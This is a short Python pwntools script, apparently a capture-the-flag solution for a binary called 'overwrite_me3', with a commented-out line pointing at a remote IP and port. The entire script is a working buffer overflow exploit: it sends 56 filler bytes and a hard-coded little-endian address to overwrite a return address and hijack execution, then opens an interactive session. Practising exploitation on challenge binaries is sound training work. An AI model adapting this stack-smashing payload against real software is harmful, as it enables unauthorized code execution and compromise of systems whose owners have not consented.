from pwn import *

def conn():
    r = process("./overwrite_me3")
    gdb.attach(r)

    # r = remote("13.48.160.64", 1003)

    return r


def main():
    r = conn()

    buffer = "A"*56
    value = "\xde\x11\x40\x00"
    align = "A"*4
    payload = buffer + value + align

    r.recvuntil(b"1-10:")
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()